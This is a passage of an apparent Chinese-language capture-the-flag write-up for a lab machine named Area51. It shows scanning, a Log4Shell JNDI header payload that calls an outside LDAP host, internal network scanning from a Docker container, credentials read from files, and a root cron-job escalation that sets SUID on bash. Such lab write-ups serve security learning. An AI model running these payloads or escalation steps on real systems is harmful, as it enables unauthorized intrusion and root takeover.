+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_3.png" alt="HMV_area51_image_3"  /></p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_4.png" alt="HMV_area51_image_4"  /></p>
+<p>继续扫一下
+没出来有价值的东西
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_5.png" alt="HMV_area51_image_5"  /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  nikto -url http://192.168.89.13:8080
+</span></span><span style="display:flex;"><span>- Nikto v2.5.0
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>+ Target IP:          192.168.89.13
+</span></span><span style="display:flex;"><span>+ Target Hostname:    192.168.89.13
+</span></span><span style="display:flex;"><span>+ Target Port:        <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>+ Start Time:         2024-04-16 19:49:52 <span style="color:#f92672">(</span>GMT8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>+ Server: No banner retrieved
+</span></span><span style="display:flex;"><span>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+</span></span><span style="display:flex;"><span>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+</span></span><span style="display:flex;"><span>+ /AZDAS9pJ.prf: Uncommon header <span style="color:#e6db74">&#39;content-disposition&#39;</span> found, with contents: inline;filename<span style="color:#f92672">=</span>f.txt.
+</span></span><span style="display:flex;"><span>+ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
+</span></span><span style="display:flex;"><span>+ HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;PUT&#39;</span> method could allow clients to save files on the web server.
+</span></span><span style="display:flex;"><span>+ HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;DELETE&#39;</span> may allow clients to remove files on the web server.
+</span></span><span style="display:flex;"><span>+ ERROR: Error limit <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> reached <span style="color:#66d9ef">for</span> host, giving up. Last error: opening stream: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t connect <span style="color:#f92672">(</span>connect error<span style="color:#f92672">)</span>: Cannot assign requested address
+</span></span><span style="display:flex;"><span>+ Scan terminated: <span style="color:#ae81ff">20</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">6</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
+</span></span><span style="display:flex;"><span>+ End Time:           2024-04-16 19:50:13 <span style="color:#f92672">(</span>GMT8<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">21</span> seconds<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------
+</span></span></code></pre></div><p>没有别的东西了</p>
+<h2 id="log4j_rce">log4j_RCE</h2>
+<p>去搜一下log4j的漏洞吧
+<code>https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability</code></p>
+<p>amazing, 使用这个请求头去查询, 就能得到不一样的响应</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>~/workspace curl 192.168.89.13:8080 -H <span style="color:#e6db74">&#39;X-Api-Version:11 &#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hello, world!#
+</span></span></code></pre></div><p>使用discovery的payload没成功外带
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_6.png" alt="HMV_area51_image_6"  /></p>
+<p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_7.png" alt="HMV_area51_image_7"  /></p>
+<p>选择使用这个工具
+<a href="https://github.com/kozmer/log4j-shell-poc" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/kozmer/log4j-shell-poc</a></p>
+<p>需要注册个jdk Oracle 官网的账号, 好困, 下次再打</p>
+<p>amazing
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_8.png" alt="HMV_area51_image_8"  /></p>
+<h2 id="docker环境">docker环境</h2>
+<p>进去之后是docker环境. 需要逃逸一下
+<img loading='lazy' decoding="async" src="https://img.l1uyun.one/HMV_area51_image_9.png" alt="HMV_area51_image_9"  /></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip a
+</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP
+</span></span><span style="display:flex;"><span>    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>接触到了一个新的工具, fscan, 常见的内网扫描工具</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fscan -h 172.17.0.2/16
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ___                              _
+</span></span><span style="display:flex;"><span>  / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __
+</span></span><span style="display:flex;"><span> / /_<span style="color:#ae81ff">\/</span>____/ __|/ __| <span style="color:#960050;background-color:#1e0010">&#39;</span>__/ _<span style="color:#e6db74">`</span> |/ __| |/ /
+</span></span><span style="display:flex;"><span>/ /_<span style="color:#ae81ff">\\</span>_____<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__|   &lt;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\_</span>___/     |___/<span style="color:#ae81ff">\_</span>__|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                     fscan version: 1.8.3
+</span></span><span style="display:flex;"><span>start infoscan
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 172.17.0.2      is alive
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 172.17.0.1      is alive
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LiveTop 172.17.0.0/16    段存活数量为: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LiveTop 172.17.0.0/24    段存活数量为: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Icmp alive hosts len is: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>172.17.0.1:8080 open
+</span></span><span style="display:flex;"><span>172.17.0.2:8080 open
+</span></span><span style="display:flex;"><span>172.17.0.1:80 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>start vulscan
+</span></span><span style="display:flex;"><span>172.17.0.1:22 open
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1         code:200 len:1131   title:FBI Access
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1:8080    code:400 len:277    title:None
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.2:8080    code:400 len:277    title:None
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://172.17.0.1:8080 -H <span style="color:#e6db74">&#39;X-Api Version:${jndi:ldap://192.168.68.99:1389/a}&#39;</span>
+</span></span></code></pre></div><p>好吧, 这样子好像不行, 之后回过来想想</p>
+<h2 id="枚举">枚举</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/tmp
+</span></span><span style="display:flex;"><span>ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxrwxrwt    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2018</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">10</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .roger
+</span></span><span style="display:flex;"><span>cat .roger
+</span></span><span style="display:flex;"><span>b3st4l13n
+</span></span></code></pre></div><h2 id="ssh登录靶机">ssh登录靶机</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:~$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> roger roger <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> roger roger    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">220</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger <span style="color:#ae81ff">3644</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> roger roger <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">807</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger   <span style="color:#ae81ff">69</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> shoppingList
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">373</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> SubjectDescription
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root  root  <span style="color:#ae81ff">1497</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> user.txt
+</span></span><span style="display:flex;"><span>roger@area51:~$ cat user.txt
+</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">`</span>--:::::::-.<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                      .://:----------://:<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">`</span>:/:.-----------------+/<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                  //-.--------------------:o-
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`</span>+-.-----------------------:o:
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>o-.------------------------:/s.
+</span></span><span style="display:flex;"><span>               +-.-------------------------://o
+</span></span><span style="display:flex;"><span>              .+.--------------------------///s<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>              +-.------------------------:////o.
+</span></span><span style="display:flex;"><span>              s.----------------------:://///:s<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>o.------------------/:+/o+/////++
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>o.------------------s/+/+/////+/<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>            .:o--------------::::/+//////++/.
+</span></span><span style="display:flex;"><span>           -o+..:/:------------/////////:.<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>           /s:.<span style="color:#e6db74">`</span> <span style="color:#e6db74">`</span>+:---://:--//++/+/:.<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">`</span>oys:::/s--/o:.<span style="color:#e6db74">````</span>o+o:.
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>/oo+:++--s/:::/+o++<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">`</span>//:----:++++++/:<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>               .+.-------:o+<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                o.-------/s<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                o.------:o-
+</span></span><span style="display:flex;"><span>                o.------+/
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>.:/.--:/:+o
+</span></span><span style="display:flex;"><span>             /o//oydNMm+:
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">```</span>hMMNMNo-
+</span></span><span style="display:flex;"><span>               :/ydysso/
+</span></span><span style="display:flex;"><span>               -s/---/o<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>               -++:--//++<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>+:--------:o.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>ee11cbb19052e40b07aac0ca060c23ee<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>roger@area51:~$
+</span></span></code></pre></div><h2 id="枚举-1">枚举</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/opt$ find / -type f -name <span style="color:#e6db74">&#34;.*&#34;</span> 2&gt;/dev/null | grep -v  sys
+</span></span><span style="display:flex;"><span>/etc/skel/.bash_logout
+</span></span><span style="display:flex;"><span>/etc/skel/.profile
+</span></span><span style="display:flex;"><span>/etc/skel/.bashrc
+</span></span><span style="display:flex;"><span>/etc/cron.weekly/.placeholder
+</span></span><span style="display:flex;"><span>/etc/.pwd.lock
+</span></span><span style="display:flex;"><span>/etc/cron.daily/.placeholder
+</span></span><span style="display:flex;"><span>/etc/.hostname.swp
+</span></span><span style="display:flex;"><span>/etc/cron.d/.placeholder
+</span></span><span style="display:flex;"><span>/etc/cron.hourly/.placeholder
+</span></span><span style="display:flex;"><span>/etc/cron.monthly/.placeholder
+</span></span><span style="display:flex;"><span>/run/network/.ifstate.lock
+</span></span><span style="display:flex;"><span>/usr/share/dictionaries-common/site-elisp/.nosearch
+</span></span><span style="display:flex;"><span>/home/roger/.bash_logout
+</span></span><span style="display:flex;"><span>/home/roger/.profile
+</span></span><span style="display:flex;"><span>/home/roger/.bashrc
+</span></span><span style="display:flex;"><span>roger@area51:/opt$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span>roger:x:1001:1001:,,,:/home/roger:/bin/bash
+</span></span><span style="display:flex;"><span>kang:x:1000:1000:,,,:/kang:/bin/bash
+</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$ find / -type f -name <span style="color:#e6db74">&#34;kang&#34;</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/pam.d/kang
+</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/pam.d/kang
+</span></span><span style="display:flex;"><span>k4ng1sd4b3st
+</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$
+</span></span></code></pre></div><h2 id="横向移动">横向移动</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kang@area51:~$ ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#ae81ff">3</span> kang kang <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">19</span> 22:56 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> kang kang <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">8</span> Apr <span style="color:#ae81ff">19</span> 22:56 weComeInPeace.sh
+</span></span><span style="display:flex;"><span>kang@area51:~$
+</span></span></code></pre></div><p>weComeInPeace. sh这个文件有时出现有时没有&hellip;&hellip;&hellip;.. 这肯定是key</p>
+<h2 id="利用定时任务提权">利用定时任务提权</h2>
+<p>上pspy试试,有个script. sh</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>      | /sbin/init
+</span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7132</span>   | /bin/sh /root/script.sh
+</span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7133</span>   | sleep <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>2024/04/19 22:58:19 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7134</span>   | /bin/sh /root/script.sh
+</span></span><span style="display:flex;"><span>2024/04/19 22:58:19 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7135</span>   | /bin/sh /root/script.sh
+</span></span><span style="display:flex;"><span>2024/04/19 22:58:21 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7136</span>   | /bin/sh /root/script.sh
+</span></span></code></pre></div><p>使用下面的payload</p>
+<p><code>for i in {1..10000}; do echo 'chmod +s /bin/bash' &gt;&gt; weComeInPeace.sh; done</code></p>
+<p>然后就获得了suid的bash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# ls -al /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Aug  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> /bin/bash
+</span></span></code></pre></div><h2 id="root">root</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# cd /root
+</span></span><span style="display:flex;"><span>bash-5.1# ls -al
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">571</span> Apr <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .mysql_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1561</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> root.txt
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">124</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> script.sh
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .script.sh.swp
+</span></span><span style="display:flex;"><span>bash-5.1# cat root.txt
+</span></span><span style="display:flex;"><span>                 :
+</span></span><span style="display:flex;"><span>                         /<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>                         :-
+</span></span><span style="display:flex;"><span>                        ..-
+</span></span><span style="display:flex;"><span>                        - <span style="color:#e6db74">`</span>-
+</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">``</span>...-........<span style="color:#e6db74">``</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`</span>..<span style="color:#e6db74">``</span>-://:-::.<span style="color:#e6db74">`</span>  <span style="color:#e6db74">``</span>..
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>-<span style="color:#e6db74">`</span>  /////+++++/.    <span style="color:#e6db74">`</span>-
+</span></span><span style="display:flex;"><span>               -    s////:-..-:/<span style="color:#e6db74">`</span>    <span style="color:#e6db74">`</span>.
+</span></span><span style="display:flex;"><span>              ..    +//:<span style="color:#e6db74">`</span>    +-<span style="color:#e6db74">`</span>-<span style="color:#e6db74">`</span>    -
+</span></span><span style="display:flex;"><span>              -   -://+<span style="color:#e6db74">`</span>     +/ <span style="color:#e6db74">`</span>o<span style="color:#e6db74">`</span>   -
+</span></span><span style="display:flex;"><span>              -   :/++//.<span style="color:#e6db74">`</span>   <span style="color:#e6db74">`</span>../+    -
+</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">`</span>.  <span style="color:#e6db74">`</span>+++++///:::/+o:    -
+</span></span><span style="display:flex;"><span>               -   <span style="color:#e6db74">`</span>+++///++////o:    -
+</span></span><span style="display:flex;"><span>               -    .++o+///////+:.   -
+</span></span><span style="display:flex;"><span>               -    .+o+Ns:d-s+///// <span style="color:#e6db74">`</span>.
+</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>.   :/mhMmhMyM++//-. -
+</span></span><span style="display:flex;"><span>                -   -/mMMMMMMMh+/-   -
+</span></span><span style="display:flex;"><span>                -    +yMMMMMMN+o-<span style="color:#e6db74">`</span>  <span style="color:#e6db74">`</span>.    <span style="color:#e6db74">`</span>....
+</span></span><span style="display:flex;"><span>         .-:-<span style="color:#e6db74">`</span>  ..  <span style="color:#e6db74">`</span>+hMmNNhN/+/:-  -   .//::///
+</span></span><span style="display:flex;"><span>      :::/::+/.  -  .+hNsyd/d-o--: <span style="color:#e6db74">`</span>-  ://.<span style="color:#e6db74">`</span> <span style="color:#e6db74">```</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">`</span>::.  //+  -<span style="color:#e6db74">`</span>  :++-++++++o...-  <span style="color:#e6db74">`</span>++<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>            .+/- <span style="color:#e6db74">`</span>-  -+://++///+.-:-  ///
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>+/+<span style="color:#e6db74">``</span>:-///://++///+//y+.-///
+</span></span><span style="display:flex;"><span>             -////sssooooooooosssssoo///-
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>.+//+ooooossoooyssoosss+//:
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">```</span>-:---///++///+++++++o+oo+++++/+/<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>  .//++//////////++////////////++///////-<span style="color:#e6db74">``</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">`</span>...<span style="color:#e6db74">`</span>  <span style="color:#e6db74">`</span>.------..-:///////+/:://////-
+</span></span><span style="display:flex;"><span>                            <span style="color:#e6db74">`</span>-:/+++.   ...<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>63a9f0ea7bb98050796b649e85481845<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>bash-5.1# cat script.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>  rm -rf /kang/*
